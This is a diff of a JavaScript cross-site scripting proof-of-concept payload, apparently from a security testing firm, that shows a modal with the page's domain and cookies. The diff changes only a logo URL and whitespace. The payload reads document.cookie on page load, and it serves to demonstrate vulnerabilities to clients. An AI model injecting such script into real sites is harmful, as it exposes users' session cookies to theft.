@@ -29,7 +29,7 @@ document.addEventListener("DOMContentLoaded", function(event) {
   \
   <div id='myModal' class='tss'>\
     <div class='tss-content'>\
-      <div style='text-align: center;'><img src=https://www.datacomtss.com.au/images/logo.png /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
+      <div style='text-align: center;'><img src=https://www.dtss.com.au/images/logo.png /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
   "<b>document.domain: </b><br>" +
   document.domain + "<br><br>" +
   "<b>document.cookie: </b><br>" +
@@ -50,11 +50,11 @@ document.addEventListener("DOMContentLoaded", function(event) {
 function tss(paramName) {
   var container = document.getElementById('tssVulnParamsContainer');
   var vulnParams = document.getElementById('tssVulnParams');
-  
+
   if (container.style.display != "block") {
     container.style.display = "block";
   }
-  
+
   if (vulnParams.textContent == "") {
     vulnParams.textContent = paramName;
   }
